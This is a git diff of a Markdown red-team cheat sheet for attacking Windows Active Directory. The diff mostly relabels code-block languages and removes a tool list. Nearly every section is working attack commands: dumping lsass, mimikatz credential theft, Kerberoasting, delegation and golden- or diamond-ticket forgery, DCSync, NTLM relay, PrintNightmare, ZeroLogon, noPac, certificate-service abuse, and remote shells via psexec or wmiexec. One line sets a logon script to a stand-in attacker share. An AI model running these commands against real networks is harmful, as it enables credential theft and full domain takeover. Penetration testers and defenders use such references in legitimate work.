@@ -41,7 +41,7 @@ ACL/ACE | Object | Permission | Abuse | ScreenShot
 | `Get-DomainGPO`                      | Get all domain GPO                     | `(&(objectCategory=groupPolicyContainer))`                                                   |
 
 Example use:
-```
+```powershell
 # Current domain context
 ([adsisearcher]"<ldap-filter>").FindAll()
 
@@ -55,7 +55,7 @@ _Note: These LDAP filters can be used with `[adsisearcher]` builtin function in 
 
 ## Situational Awareness
 ### Forest Trust
-```
+```python
 # Map all domain trusts
 Get-DomainTrustMapping -Verbose
 
@@ -63,11 +63,11 @@ Get-DomainTrustMapping -Verbose
 Get-DomainTrust
 ```
 ### ASREP Roasting
-```
+```python
 Get-DomainUser -PreauthNotRequired
 ```
 ### Kerberoasting
-```
+```python
 # Powerview
 Get-DomainUser -SPN
 
@@ -75,7 +75,7 @@ Get-DomainUser -SPN
 Rubeus.exe kerberoast /nowrap
 ```
 ### Unconstrained / Constrained Object
-```
+```python
 # unconstrained computer
 Get-DomainComputer -Unconstrained -Properties name
 
@@ -87,16 +87,16 @@ You can abuse these delegation permission by referring [here](#unconstrained-del
 
 ## Constrained Language Mode (CLM) / WDAC / Device Guard
 ### CLM Enumeration
-```
+```python
 $ExecutionContext.SessionState.LanguageMode
 ```
 ### View AppLocker Rules
-```
+```python
 Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
 ```
 ### Dump lsass process with signed binary
 This method will bypass CLM to dump lsass since we are using MS signed binary (whitelisted)
-```
+```python
 # Run this in victim/remote computer
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Tasks\lsass.dmp full
 
@@ -113,24 +113,24 @@ mimikatz# sekurlsa::logonpasswords
 Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with `Rubeus`.
 
 1. Verify that remote computer has spooler service running
-	```
-	ls \\dc01.contoso.local\pipe\spoolss
-	```
+```python
+ls \\dc01.contoso.local\pipe\spoolss
+```
 
 2. Download spoolsample [here](https://github.com/leechristensen/SpoolSample) and run the following command to authenticate and capture ticket.
-	```
-	# run this on domain joined computers
-	spoolsample.exe dc01.contoso.local ms01.contoso.local
-	# or can use this command for linux workstation
-	python3 printerbug.py contoso.local/donald:'Changeme123'@10.200.60.202 10.50.57.128
+```python
+# run this on domain joined computers
+spoolsample.exe dc01.contoso.local ms01.contoso.local
+# or can use this command for linux workstation
+python3 printerbug.py contoso.local/donald:'Changeme123'@10.200.60.202 10.50.57.128
 
-	# monitor ticket
-	Rubeus.exe monitor /interval:5
-	```
+# monitor ticket
+Rubeus.exe monitor /interval:5
+```
 
 ### Extract TGT
 Since unconstrained computers will save users tgt (logged in users). We will extract this keys and able to impersonate them.
-```
+```python
 mimikatz# sekurlsa::tickets /export
 Rubeus.exe ptt /ticket:ticket.kirbi
 ```
@@ -139,7 +139,7 @@ Rubeus.exe ptt /ticket:ticket.kirbi
 ### s4u delegation
 This attack is possible if `msds-AllowedToDelegateTo` is set.
 * with rc4 hash in hand
-```
+```python
 # Request TGT + TGS
 Rubeus.exe s4u /user:attacker /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,host,http /domain:contoso.local /dc:dc01.contoso.local /ptt
 
@@ -147,7 +147,7 @@ Rubeus.exe s4u /user:attacker /rc4:<rc4 hash> /impersonateuser:administrator /ms
 getST.py -spn cifs/TargetComputer.range.net 'range.net/FakeComputer$:newpassword123' -impersonate administrator -dc-ip 192.168.86.182
 ```
 * with owned user session (not knowing his rc4)
-```
+```python
 # Request for ticket
 Rubeus.exe tgtdeleg /nowrap
 
@@ -163,25 +163,25 @@ This attack is possible if owned user/computer object has _GenericWrite_ or writ
 | Principal's plain-text or hashes (rc4/aes-256)    | Range2022!  | 
 1. Import ADModule
 2. Set _msds-allowedtoactonbehalfofotheridentity_ to owned computer/user objects.
-	```
-	# AD-Module
-	Set-ADComputer -Identity dc01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer mycomputer)
+```python
+# AD-Module
+Set-ADComputer -Identity dc01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer mycomputer)
 
-	# pywerview
-	Add-DomainObjectAcl -TargetIdentity dc01 -PrincipalIdentity mycomputer -Rights rbcd
-	```
-3. Get mycomputer$ ntlm hash or aes keys
-	```
-	mimikatz# sekurlsa::logonpasswords
-	```
-4. Apply s4u delegation (TGT+TGS)
-	```
-	# rubeus
-	Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs /ptt
+# pywerview
+Add-DomainObjectAcl -TargetIdentity dc01 -PrincipalIdentity mycomputer -Rights rbcd
+```
+1. Get mycomputer$ ntlm hash or aes keys
+```python
+mimikatz# sekurlsa::logonpasswords
+```
+1. Apply s4u delegation (TGT+TGS)
+```python
+# rubeus
+Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs /ptt
 
-	# impacket 
-	getST.py range.net/mssqlsvc:'Range2022!' -dc-ip 192.168.86.182 -spn cifs/dc01.range.net -impersonate Administrator
-	```
+# impacket 
+getST.py range.net/mssqlsvc:'Range2022!' -dc-ip 192.168.86.182 -spn cifs/dc01.range.net -impersonate Administrator
+```
 
 #### References
 1. [Harmj0y's gist on abusing RBCD with PowerShell/PowerView/PowerMad](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff)
@@ -190,14 +190,14 @@ This attack is possible if owned user/computer object has _GenericWrite_ or writ
 ## ACLs/ACEs Abuse
 ### Force Change User Password
 _Note: This doesn't require you to know the owned user's credential_
-```
+```python
 # PowerView
 Set-DomainUserPassword -Identity studentadmin -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!')
 ```
 
 ### Change password with credential
 _Note: Need to know owned user's password_
-```
+```python
 # Create PSCredential Object
 $username='contoso\administrator'
 $password=ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!'
@@ -209,7 +209,7 @@ Set-DomainUserPassword -Identity studentadmin -Domain contoso.local -AccountPass
 
 ### Add Users to Group
 This command will add specific principal to a group that exists in the domain. _Note that there are several tools to perform this. Below are some of the methods that can be used. Checkout this cool tool [bloodyAD](https://github.com/CravateRouge/bloodyAD)_
-```
+```python
 # PowerView
 Add-DomainGroupMember -Identity cadmins -Members lowpriv
 
@@ -219,7 +219,7 @@ net.exe group 'cadmins' lowpriv /add /domain
 
 ### Targeted Kerberoast
 This technique will update `ServicePrincipalName` of a user object. Make sure to have a write permission on the user's attributes.
-```
+```python
 # Set SPN
 ## Windows
 Set-DomainObject -Identity sqlsvc -Set @{serviceprincipalname='my/sqlspn'}
@@ -229,30 +229,30 @@ Set-DomainObject -Identity sqlsvc -Clear serviceprincipalname
 ```
 
 There is also a repo [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to automatically discover ACLs from the current user context against other domain objects looking for _Write_ permission on `servicePrincipalName` attribute. 
-```
+```python
 python3 targetedKerberoast.py -u jsparrow -p Password123 -d range.net --dc-ip 10.10.10.10
 ```
 
 ### Overwrite Logon Script
 Logon Script will run everytime user logged in._(note: use ad module)_
-```
+```python
 Set-ADObject -SamAccountName  -PropertyName scriptpath -PropertyValue "\\attackerip\script.ps1"
 ```
 
 ### Add DCSync Privilege to object
-```
+```python
 Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity studentuser -Rights DCSync
 ```
 
 ### Read LAPS Local Administrator Password
 This will only possible if you have _AllExtendedRights_ permission on a computer object.
-```
+```python
 Get-DomainComputer -Properties ms-mcs-admpwd
 ```
 
 ## Weak GPO Permission
 ### Enumerate weak GPO Permission
-```
+```python
 # Domain wide
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs | ? {$_.activedirectoryrights -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner"}}
 
@@ -261,7 +261,7 @@ Get-DomainGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name | ? {$_.ActiveDirect
 ```
 
 ### GPO Abuse with PowerView
-```
+```python
 # Execute specific tasks
 New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments 'net.exe localgroup administrators dummyuser /add' -Force
 
@@ -273,7 +273,7 @@ gpoupdate /force
 I did most of my SQL Server Enumeration by using this [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL) script. Refer to more commands in this [PowerUpSQL Cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
 ### Get SQL Instances
 This method will allow you to enumerate local or domain sql servers(if any).
-```
+```python
 # Get Local Instance
 Get-SQLInstanceLocal -Verbose
 
@@ -282,7 +282,7 @@ Get-SQLInstanceDomain -Verbose
 ```
 ### Get SQL Linked Server
 This command will allow you to enumerate linked sql server to selected instance. Output of the command also shows privilege that you currently have on specific sql server
-```
+```python
 # Enumerate Linked Server (show just instace and priv)
 Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local
 
@@ -293,7 +293,7 @@ Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local -Query 'exec master..xp
 _Prerequisite:_
 * Make sure you are **sa** user (high privileged user)
 * Make sure to enable `xp_cmdshell` before executing os command
-```
+```python
 # Enable xp_cmdshell
 Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "DB-SQLSRV"'
 
@@ -313,7 +313,7 @@ This attack made possible since there is no security boundary between domains. H
 | Parent domain EA SID | `S-1-5-21-378720957-2217973887-3501892633-519` |
 
 1. Forge a [Golden Ticket](#golden-ticket) that contains _extra sid_ of the parent domain's Enterprise Admins.
-```
+```python
 # windows
 mimikatz# kerberos::golden /user:Administrator /domain:child.domain.local [/ntlm|/aes256]:833ef1dcc490f88a8f4a8a00859736de /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-519 /ptt
 
@@ -322,13 +322,13 @@ ticketer.py -nthash 833ef1dcc490f88a8f4a8a00859736de -domain-sid S-1-5-21-326306
 ```
 
 2. Use the ticket to perform Pass The Ticket (PTT) and win!. Ensure to use FQDN if you encounter any errors. _Note that if you ran mimikatz command with `/ptt` flag already does the following step. Hence you might want to skip this step_
-```
+```python
 export KRB5CCNAME=Administrator.ccache
 secretsdump.py child.domain.local/Administrator@dc01.domain.local -just-dc -k -no-pass
 ```
 
 Above steps could be automated with [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) if you obtain a privileged account (i.e. Domain Admin). _-debug flag is <3_
-```
+```python
 raiseChild.py -target-exec dc-1.domain.local child.domain.local/domainadm -hashes :2e8a408a8aec852ef2e458b938b8c071 -debug
 ```
 
@@ -348,17 +348,17 @@ If _TREAT\_AS\_EXTERNAL_ flag is set in **trustAtrributes** property, that means
 2. Forge Inter-Realm TGT with extra sids. We injected sid of trusted domain users with RID > 1000. This is because most _WELL-KNOWN-SID_ is flag as _ForestSpecific_ based on the [documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280) 
 >The ForestSpecific rule is for those SIDs that are never allowed in a PAC that originates from out of the forest or from a domain that has been marked as QuarantinedWithinForest, unless it belongs to that domain.
 
-```
+```python
 mimikatz# kerberos::golden /user:administrator /domain:contoso.local /sid:<domain-sid> /rc4:<trust-key> /service:krbtgt /target:fortress.local /sids:<victim-user-sid> /ticket:<path>\ticket.kirbi
 ```
 3. Asktgs with the generated kirbi ticket
-```
+```python
 Rubeus.exe asktgs /ticket:<path>\ticket.kirbi /service:HTTP/dc02.contose.local /dc:dc02.contoso.local /ptt
 ```
 
 ### Shadow Principal/PAM Trust
 The users in current forest can be "mapped" to privileged group like Domain Admins and Enterprise Admins. Use below command to enumerate _Shadow Principal_
-```
+```python
 Get-ADObject -Filter * -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) | select Name,member,msDS-ShadowPrincipalSid | fl
 ```
 * `name` = Name of the shadow security principal
@@ -367,7 +367,7 @@ Get-ADObject -Filter * -SearchBase ("CN=Shadow Principal Configuration,CN=Servic
 
 ### Foreign Principal
 Foreign principal means other user(s) from trusted domain that have access to current domain resources
-```
+```python
 # Get foreign user principals
 Find-ForeignUser
 
@@ -390,7 +390,7 @@ mimikatz# lsadump::trust /patch
 [[..snip..]]
 ```
 2. Request TGT for the trust account by using the key dumped (aes/rc4). _Note: this wouldn't work over NTLM authentication, only kerberos_
-```
+```python
 # rubeus
 Rubeus.exe asktgt /user:RANGE$ /rc4:4cc0dd338664b4208fa6a1a4a7bee224 /domain:kiwi.local /dc:kiwi-dc.kiwi.local /nowrap
 
@@ -401,7 +401,7 @@ getTGT.py kiwi.local/range\$ -hashes :4cc0dd338664b4208fa6a1a4a7bee224 -dc-ip 19
 ## Lateral Movement / Post Exploitation
 ### Overpass-The-Hash (OPTH)
 _Note: This requires local administrator privilege_
-```
+```python
 # NTLM hash
 mimikatz# sekurlsa::pth /user:administrator /ntlm:<ntlm hash> /domain:CONTOSO /run:powershell.exe
 
@@ -411,7 +411,7 @@ mimikatz# sekurlsa::pth /user:administrator /aes256:<aes256 key> /domain:CONTOSO
 
 ### Request TGT
 _Note: This will be log by the KDC_
-```
+```python
 # With plain-text
 Rubeus.exe asktgt /user:administrator /password:P@$$w0rd! /domain:contoso /ptt
 
@@ -425,7 +425,7 @@ export KRB5CCNAME=lowpriv.ccache
 
 ### runas
 This method will spawn a new process as the user. This wont validate your password, so make sure you enter it right. Slowly but surely :)
-```
+```powershell
 runas /user:contoso\administrator /netonly powershell
 ```
 
@@ -434,7 +434,7 @@ _Note: This attack will only work if SMB signing if disabled. This can be verify
 
 1. Disable **SMB** and **HTTP** in `/etc/Responder.conf`
 2. Fire up responder. **SMB** and **HTTP** protocol now should now show as [OFF]
-```
+```python
 Responder.py -I eth0 -rdvw
 ```
 1. Create a targets.txt file containing targeted ip addresses. `ntlmrelayx.py` will run captured hash to every protocol available on the given ip addresses
@@ -443,11 +443,11 @@ all://192.168.0.10
 all://192.168.0.11
 ```
 1. Run `ntlmrelayx.py`
-```
+```python
 ntlmrelayx.py -tf targets.txt -smb2support -socks
 ```
 1. Authenticate with any available Impacket scripts through `proxychains` and supply no password
-```
+```python
 # PsExec
 proxychains Psexec.py contoso/administrator:''@192.168.0.10
 
@@ -457,7 +457,7 @@ proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15 -windows-auth -debug
 
 ### Credential Harvesting
 ### DCSync
-```
+```python
 # Dump all available domain users
 mimikatz# lsadump::dcsync /domain:fqdn /all /csv
 
@@ -478,7 +478,7 @@ A golden ticket is signed and encrypted by the hash of krbtgt account which make
 | Domain SID  | S-1-5-21-1935943001-39345449-285568504 |
 | krbtgt hash | 7e8612a348a729bcb2f597a9cbc27c12       |
 | Username    | trex                                   |
-```
+```python
 # Mimikatz
 kerberos::golden /domain:legitcorp.local /sid:S-1-5-21-1935943001-39345449-285568504 /rc4:7e8612a348a729bcb2f597a9cbc27c12 /user:trex /ptt
 
@@ -500,11 +500,11 @@ i. Request normal user TGT
 ii. Decrypt the TGT with krbtgt aes key
 iii. Modify ticket PAC and insert _rangeadm_ in the PAC
 ```
-```
+```python
 Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee /user:loki /password:Password123 /enctype:aes /domain:range.net /dc:dc01.range.net /ticketuser:rangeadm /ticketuserid:1104 /groups:512 /nowrap
 ```
 1. To verify the Diamond ticket (modified TGT), requst a service ticket (TGS)
-```
+```powershell
 .\Rubeus.exe asktgs /ticket:<tgt> /service:cifs/dc01.range.net /nowrap
 ```
 For detailed explanation, read this article by Semperis [here](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
@@ -513,7 +513,7 @@ For detailed explanation, read this article by Semperis [here](https://www.sempe
 Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls the services to which a user accounts has access to. This means, with enough privileges, it is possible to access any service from a target user.
 
 1. Set the `msDS-AllowedToDelegateTo` attribute of a user _lowpriv_ to give privilege for it to request ticket for _cifs_ service to dc01.
-```
+```python
 # AD Module / RSAT
 Set-ADUser -Identity lowpriv -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.legitcorp.local')} -Verbose
 
@@ -525,7 +525,7 @@ Set-DomainObject -SamAccountName lowpriv -Xor @{"useraccountcontrol"="16777216"}
 setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'lowpriv' -spn 'cifs/dc01.legitcorp.local'
 ```
 1. Request the service ticket for _cifs_ service with impacket [getST.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/getST.py) and impersonate to administrator.
-```
+```python
 # Rubeus
 Rubeus.exe hash /user:lowpriv /password:'P@$$w0rd!xyz' /domain:legitcorp.local
 Rubeus.exe s4u /user:lowpriv /rc4:098D747A5D113F6AE9D6A599EB8E539B /domain:legitcorp.local /impersonateuser:administrator /msdsspn:cifs/dc01.legitcorp.local /ptt
@@ -535,7 +535,7 @@ getST.py -spn cifs/dc01.legitcorp.local legitcorp.local/lowpriv:'P@$$w0rd!xyz' -
 export KRB5CCNAME='administrator.ccache'
 ```
 1. Getting an interactive shell with smbexec.py. Note that there are other several ways to achieve this and executing smbexec.py or psexec.py might cause a noisy traffic on the environment.
-```
+```python
 # Sysinternal
 PsExec64.exe -accepteula \\dc01.legitcorp.local cmd
 
@@ -553,7 +553,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 ```
 1. Add a new value to one of the KeyName above 
-```
+```powershell
 reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RunMe /t REG_SZ /d "C:\Users\Public\mybinary.exe"
 ```
 
@@ -608,7 +608,7 @@ winrs -u:dc01.contoso.local -u:contoso\administrator -p:P@$$w0rd! "hostname"
 ### SMB 
 **PsExec**
 This requires you to download MS Signed Binary (`PsExec.exe`) in PsTools bundle. It can be downloaded [here](https://download.sysinternals.com/files/PSTools.zip).
-```
+```powershell
 # windows
 PsExec.exe -accepteula \\dc01.contoso.local powershell
 
@@ -616,18 +616,18 @@ PsExec.exe -accepteula \\dc01.contoso.local powershell
 psexec.py legitcorp.local/Administrator@192.168.0.110
 ```
 **SMBExec**
-```
+```python
 smbexec.py legitcorp.local/Administrator@192.168.0.110
 ```
 
 ### WMI
-```
+```python
 wmiexec.py legitcorp.local/Administrator@192.168.0.110
 ```
 
 ### DCOM
 ShellBrowserWindow object can be leverage for remote code execution over DCOM. Please note that this requires authentication (e.g. runas netonly)
-```
+```powershell
 PS> $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"192.168.112.200")
 PS> $obj = [System.Activator]::CreateInstance($com)
 PS> $obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
@@ -676,24 +676,20 @@ $filename='<file-path-to>\payload.bin'
 .\GadgetToJScript.exe -b -w vbs -o realtest -c .\real.cs
 ```
 6. Execute on remote computer
-```powershell
+```cmd
 wscript.exe .\realtest.vbs
 ```
-# Extra Red Teaming Tools (that i know of xD)
-* [MacroPack](https://github.com/sevagas/macro_pack) - Generate obfuscated Office Macro
-* [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) - Check for signature based detection, this support AMSI check as well
-* [ADConnect Dump](https://github.com/fox-it/adconnectdump) - Dumps Azure On-Prem ADConnect
 
 ## Low Hanging Fruits
 ### ZeroLogon
 Set the computer account's password to null allowing attackers to perform [DCSync](#dcsync) attack with null authentication
 1. Run exploit script [here](https://github.com/risksense/zerologon.git)
-```
+```python
 python3 set_empty_pw.py DC01 10.10.10.10
 ```
 
 2. Perform DCSync with null auth
-```bash
+```python
 python3 secretsdump.py -just-dc -no-pass testlab/DC01\$@10.10.10.10
 ```
 
@@ -731,7 +727,7 @@ msfvenom -p windows/x64/exec CMD="net.exe localgroup administrators testuser /ad
 ```
 
 2. Run these commands _(either one)_
-```
+```powershell
 # Powershell
 Import-Module .\cve-2021-1675.ps1
 Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
@@ -749,54 +745,54 @@ python3 CVE-2021-1675.py testlab/testuser:'P@$$w0rd!'@10.10.10.10 '\\10.10.10.10
 This exploit will require a valid domain user regardless the level of privilege given as long as it can create a computer account on the domain. Here are the steps.
 
 1. Create a fake computer with [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad) script.
-```
+```powershell
 New-MachineAccount -MachineAccount "FakeComputer" -Password $password -Domain legitcorp.local -DomainController DC01.legitcorp.local -Verbose
 ```
 
 2. Clear the fake computer's ServicePrincipalName (SPN) value
-```
+```powershell
 Set-DomainObject "CN=FakeComputer,CN=Computers,DC=legitcorp,DC=local" -Clear "serviceprincipalname" -Verbose -Domain legitcorp.local
 ```
 
 3. Rename the fake computer samaccountname to domain controller name (FakeComputer$ -> DC01)
-```
+```powershell
 Set-MachineAccountAttribute -MachineAccount "FakeComputer" -Value "DC01" -Attribute samaccountname -Domain legitcorp.local -Verbose
 ```
 
 4. Request a TGT of the domain controller
-```
+```powershell
 Rubeus.exe asktgt /user:DC01 /password:Password2 /domain:legitcorp.local /dc:DC01.legitcorp.local /nowrap
 ```
 
 5. Rename the fake computer name to its original name (DC01 -> FakeComputer$)
-```
+```powershell
 Set-MachineAccountAttribute -MachineAccount "FakeComputer" -Value "FakeComputer" -Attribute samaccountname -Verbose -Domain legitcorp.local
 ```
 
 6. Request TGS on behalf of the domain controller ticket we obtained previously.
-```
+```powershell
 Rubeus.exe s4u /impersonateuser:DC01$ /nowrap /dc:DC01.legitcorp.local /self /altservice:ldap/DC01.legitcorp.local /ptt /ticket:<base64-blob-ticket>
 ```
 
 7. Perform cleanup (OPSEC Friendly)
-```
+```powershell
 Remove-MachineAccount -Domain legitcorp.local -MachineAccount FakeComputer
 ```
 
 ### Automated Exploit
 There are a few automated scripts and tools out there to perform this exploit. This are some of the tools that i use previously on an engagement.
 * Python (https://github.com/Ridter/noPac.git)
-```
+```powershell
 python3.exe .\noPac.py domain.local/lowpriv:Passw0rd -dc-ip 10.0.10.10 -dc-host DC01 --impersonate administrator -dump
 ```
 
 * CSharp (https://github.com/cube0x0/noPac.git)
-```
+```powershell
 noPac.exe -domain domain.local -user low_priv -pass 'P@ssw0rd' /dc dc01.domain.local /mAccount FakeComputer /service [ldap,cifs,http] /ptt
 ```
 
 Note: _Always perform cleanup if you are exploiting this against the corporate environment. You can use the following command to verify and remove a computer account_
-```
+```powershell
 # verify computer account with wmic
 wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
 
@@ -813,11 +809,11 @@ https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing
 It is recommended to use below commands with `-k` option and .cacche file. Please refer [Request TGT](#request-tgt) section
 
 1. Enumerate CA(s) on the domain
-```
+```python
 python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --class ca
 ```
 2. Enumerate for vulnerable templates
-```
+```powershell
 # Windows
 Certify.exe find /clientauth
 
@@ -825,7 +821,7 @@ Certify.exe find /clientauth
 python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --vuln --enable
 ```
 3. Request cert from CA
-```
+```powershell
 # Windows
 Certify.exe request /ca:dc.legitcorp.local\CA01 /template:vuln-template
 
@@ -833,7 +829,7 @@ Certify.exe request /ca:dc.legitcorp.local\CA01 /template:vuln-template
 python3 certi.py req '<domain>/<username>@<ca-server>' <ca-service-name> -k -n --dc-ip <dc-ip> --template <vuln-template> --alt-name <target-domain-account>
 ```
 4. Retrieve TGT by using the certificate
-```
+```python
 # Windows
 Rubeus.exe asktgt /user:lowpriv /certificate:cert.pfc /password:P@$$w0rd
 
@@ -842,7 +838,7 @@ python3 gettgtpkinit.py <domain>/<username> -cert-pfx <pfx-certificate-file> -pf
 ```
 5. Retrieve NTLM hash (optional)
 At this point, you can either use environment variable `KRB5CCNAME` to be used with ccache file or you can either get ntlm hash from the ticket with the following Commands
-```
+```powershell
 python3 getnthash.py -key <AS-REP-encryption-key> -dc-ip <dc-ip> <domain>/<username> output_tgt.ccache
 ```
 
@@ -861,7 +857,7 @@ What makes a template vulnerable to ESC1 is when the following requirements are 
 _Note that you would require one valid user to enroll the certificate_
 
 1. List for available vulnerable templates using [certi](https://github.com/eloypgz/certi)
-```
+```python
 python3 certi.py list range.net/peter:'Welcome1234' --dc-ip 10.8.0.2 --vuln --enabled
 
 # output should normally be like this
@@ -885,7 +881,7 @@ Permissions
 ```
 
 2. If requirements are met, then request the certificate using certi by specifying alternate name that include a high privileged user (ie Domain Admins)
-```
+```python
 python3 certi.py req range.net/peter:'Welcome1234'@CA01.range.net range-CA01-CA -k -n --template 'VulnUser' --alt-name 'rangeadm'
 ```
 
@@ -895,7 +891,7 @@ python3 gettgtpkinit.py range.net/rangeadm -cert-pfx /opt/certi/rangeadm@range.n
 ```
 
 4. Now a ccache file should now be retrieved. Export the ccache file into `KRB5CCNAME` environment variable and [DCSync](#dcsync)
-```
+```python
 secretsdump.py range.net/rangeadm@10.8.0.2 -k -no-pass -just-dc -just-dc-user 'range\krbtgt'
 ```
 _Note that you could also recover ntlm has with getnthash.py script_
@@ -904,7 +900,7 @@ _Note that you could also recover ntlm has with getnthash.py script_
 This attack is possible when a low-privileged user has _Write Property_ or any other rights to modify template configuration to allow [ESC1](#esc1) attack to work. [modifyCertTemplate.py](https://github.com/fortalice/modifyCertTemplate) will be used in the following steps
 
 1. Verify the vulnerable template with [certi]() 
-```
+```python
 python3 certi.py list range.net/peter:'Welcome1234' --dc-ip 10.8.0.2 --enabled
 
 # vulnerable template
@@ -917,7 +913,7 @@ Permissions
 ```
 
 2. Once vulnerable template has been verified. Modify the necessary requirements to proceed with [ESC1](#esc1) attack path
-```
+```python
 # msPKI-Certificate-Name-Flag = (0x1) ENROLLEE_SUPPLIES_SUBJECT
 python3 modifyCertTemplate.py range.net/peter:'Welcome1234' -template ESC4 -value 1 -property msPKI-Certificate-Name-Flag -dc-ip 10.8.0.2
 ```
@@ -929,11 +925,11 @@ python3 modifyCertTemplate.py range.net/peter:'Welcome1234' -template ESC4 -valu
 This requires NTLMv2 relaying from target identity to the /certsrc/certfnsh.asp endpoint to request a certificate. Below are the steps to reproduce
 
 1. Fire up `ntlmrelayx.py` to listen for incoming hash and relay it to target url
-```
+```python
 ntlmrelayx.py -t http://192.168.86.183/certsrv/certfnsh.asp -smb2support --adcs --template 'KerberosAuthentication'
 ```
 2. Coerce authentication using [PetitPotam](https://github.com/topotam/PetitPotam). _Note that patched system doesnt allow unauthenticated coerce, then it would require a credential_
-```
+```python
 # unpatched DC
 python3 PetitPotam.py 192.168.86.165 192.168.86.182
 
@@ -941,11 +937,11 @@ python3 PetitPotam.py 192.168.86.165 192.168.86.182
 python3 PetitPotam.py -u 'peter' -p 'Welcome1234' -d 'range.net' 192.168.86.165 192.168.86.182
 ```
 3. A base64 encoded ticket should be retrieved by now and save it in a file. Use gettgtpkinit.py to convert the pfx certificate to ccache format 
-```
+```python
 python3 /opt/AD/PKINITtools/gettgtpkinit.py range.net/dc01\$ -pfx-base64 $(cat /tmp/b64-cert.b64) -dc-ip 192.168.86.182 /tmp/out.ccache
 ```
 4. Use getnthash.py to retrieve ntlm hash
-```
+```python
 python3 /opt/AD/PKINITtools/getnthash.py range.net/dc01\$ -key c5deec1a9ef6cbaf6da31cb46c1398fdc47c37630375896ee412f3462332503b -dc-ip 192.168.86.182
 ```
 5. NTLM hash should now be retrieved and win!
@@ -955,7 +951,7 @@ python3 /opt/AD/PKINITtools/getnthash.py range.net/dc01\$ -key c5deec1a9ef6cbaf6
 **User** template certificate would identify and distinguish the certificate with the User Principal Name(UPN) of the certificate as _SubjectAltRequireUpn_ is in the `msPKI-Certificate-Name-Flag` attributes. However, **Machine** template distinguish computer accounts' certificates only by `dnsHostName` attribute which can be edited out and cause confusion in the KDC and attacker can request certificate as DC instead of the legitimate computer and results in a [DCSync](#dcsync) attack.
 
 1. Add a fake computer account with [PowerMad](https://github.com/Kevin-Robertson/Powermad) or [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)
-```
+```python
 # Powermad
 New-MachineAccount -MachineAccount 'FakeComputer' -Password (ConvertTo-SecureString -AsPlainText -Force 'Password123') -Domain domain.local -DomainController dc.domain.local -Verbose
 
@@ -964,38 +960,38 @@ addcomputer.py domain.local/john:'Passw0rd1' -method LDAPS -computer-name 'JOHNP
 ```
 
 2. Clear the SPNs attributes that relates to the current `dnsHostName` attribute.
-```
+```python
 addspn.py --clear -t 'FakeComputer$' -u 'domain\user' -p 'password' 'DC.domain.local'
 ```
 
 3. Change dnsHostName attribute matching the domain controller
-```
+```powershell
 # RSAT
 Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
 ```
 
 _Note that above steps 1-3 could be automated with my messy script [certifried.py](https://github.com/aniqfakhrul/certifried.py)_
-```
+```python
 python3 certifried.py range.net/peter:'Welcome1234' -dc-ip 192.168.86.182
 ```
 
 4. Request certificate with [Certipy](https://github.com/ly4k/Certipy)
-```
+```python
 certipy req range.net/WIN-JLSLKICW6EP\$:'PY2nc0ubG8WT'@ca01.range.net -ca range-CA01-CA -template Machine
 ```
 
 5. Authenticate with the requested certificate earlier
-```
+```python
 certipy auth -pfx dc01.pfx -dc-ip 192.168.86.182
 ```
 
